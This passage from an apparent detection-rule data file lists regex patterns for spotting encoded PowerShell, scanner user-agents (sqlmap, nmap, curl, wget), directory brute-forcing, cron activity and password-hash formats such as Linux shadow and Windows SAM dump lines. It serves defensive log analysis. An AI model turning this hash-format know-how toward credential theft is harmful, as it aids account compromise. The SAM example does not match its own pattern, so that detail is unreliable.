      pattern: "<EventID>(\\d+)</EventID>",
      description: "Extracts Windows Event IDs from XML-formatted event logs. Key IDs: 4624 (logon), 4625 (failed), 4688 (process), 1102 (cleared).",
      examples: ["<EventID>4625</EventID>"],
      falsePositives: "None.",
      severity: "Info",
      category: "Windows Logs"
    },
    {
      name: "Base64 Encoded Command (PowerShell)",
      pattern: "(?i)-enc(?:odedcommand)?\\s+([A-Za-z0-9+/=]{20,})",
      description: "Detects Base64-encoded PowerShell commands. Commonly used by malware to obfuscate commands.",
      examples: ["powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0..."],
      falsePositives: "Legitimate encoded commands in automation scripts.",
      severity: "High",
      category: "Execution"
    },
    {
      name: "Suspicious User-Agent",
      pattern: "(?i)(sqlmap|nikto|dirbuster|gobuster|wfuzz|burp|nessus|nmap|masscan|zgrab|nuclei|httpx|curl/|wget/|python-requests|go-http-client)",
      description: "Detects user-agent strings from common security scanning tools.",
      examples: ["User-Agent: sqlmap/1.6", "User-Agent: Nikto/2.1.6"],
      falsePositives: "Legitimate security scanning by authorized teams.",
      severity: "Medium",
      category: "Web Logs"
    },
    {
      name: "Excessive 404 Responses (Directory Brute Force Indicator)",
      pattern: "\" 404 \\d+",
      description: "Matches HTTP 404 responses in access logs. High frequency from a single IP indicates directory brute-forcing.",
      examples: ["\"GET /admin HTTP/1.1\" 404 1234"],
      falsePositives: "Broken links, crawlers, normal browsing.",
      severity: "Low",
      category: "Web Logs"
    },
    {
      name: "Cron Job Execution",
      pattern: "CRON\\[(\\d+)\\]:\\s+\\((.+?)\\)\\s+CMD\\s+\\((.+?)\\)",
      description: "Matches cron job execution entries in syslog. Captures PID, user, and command.",
      examples: ["CRON[12345]: (root) CMD (/opt/scripts/backup.sh)"],
      falsePositives: "None — standard cron logging.",
      severity: "Info",
      category: "System Logs"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // HASH FORMAT IDENTIFICATION
  // ═══════════════════════════════════════════════════════════════════════════
  hashes: [
    {
      name: "MD5 Hash",
      pattern: "^[a-f0-9]{32}$",
      description: "32-character hexadecimal string. Could be MD5, NTLM, or MD4.",
      examples: ["5d41402abc4b2a76b9719d911017c592"],
      falsePositives: "NTLM hashes are also 32 hex chars. Context determines type.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "SHA-1 Hash",
      pattern: "^[a-f0-9]{40}$",
      description: "40-character hexadecimal string. SHA-1 or RIPEMD-160.",
      examples: ["aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"],
      falsePositives: "MySQL 5.x hashes (with * prefix) are also 40 chars.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "SHA-256 Hash",
      pattern: "^[a-f0-9]{64}$",
      description: "64-character hexadecimal string. SHA-256 or SHA-3-256.",
      examples: ["2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"],
      falsePositives: "Other 256-bit hashes.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "SHA-512 Hash",
      pattern: "^[a-f0-9]{128}$",
      description: "128-character hexadecimal string. SHA-512, SHA-3-512, or BLAKE2b-512.",
      examples: ["3615f80c9d293ed7402687f94b22d58e..."],
      falsePositives: "Other 512-bit hashes.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "bcrypt Hash",
      pattern: "^\\$2[aby]?\\$\\d{2}\\$[./A-Za-z0-9]{53}$",
      description: "Bcrypt password hash. Prefix indicates version: $2a$, $2b$, $2y$. Two-digit cost factor.",
      examples: ["$2b$12$LJ3m4ys3Lg3QZf7ORPpHZ.jYCMHv2jG8YQ8fJq9CrO3eFpTqBc4Xy"],
      falsePositives: "None — format is distinctive.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "Linux Shadow (SHA-512 crypt)",
      pattern: "^\\$6\\$[a-zA-Z0-9./]{1,16}\\$[a-zA-Z0-9./]{86}$",
      description: "Linux /etc/shadow SHA-512 password hash with $6$ prefix.",
      examples: ["$6$salt$hash..."],
      falsePositives: "None.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "Linux Shadow (SHA-256 crypt)",
      pattern: "^\\$5\\$[a-zA-Z0-9./]{1,16}\\$[a-zA-Z0-9./]{43}$",
      description: "Linux /etc/shadow SHA-256 password hash with $5$ prefix.",
      examples: ["$5$salt$hash..."],
      falsePositives: "None.",
      severity: "Info",
      category: "Hash Detection"
    },
    {
      name: "Windows SAM Hash Line",
      pattern: "^[^:]+:\\d+:[a-f0-9]{32}:[a-f0-9]{32}:::$",
      description: "Windows SAM database hash dump format: username:RID:LM_hash:NT_hash:::",
      examples: ["Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::"],
      falsePositives: "None.",
      severity: "Critical",
      category: "Hash Detection"
    },
  ],
};
